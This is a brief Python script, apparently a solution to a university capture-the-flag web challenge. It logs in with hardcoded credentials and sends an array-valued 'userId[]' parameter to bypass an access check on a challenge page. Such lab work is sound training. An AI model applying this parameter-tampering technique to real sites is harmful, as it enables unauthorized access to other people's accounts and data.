import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4"

postData = {"userId[]":"c51ce410c124a10e0db5e4b97fc2af39"}

response2 = session.post(targetUrl, data=postData)

print(response2.text)
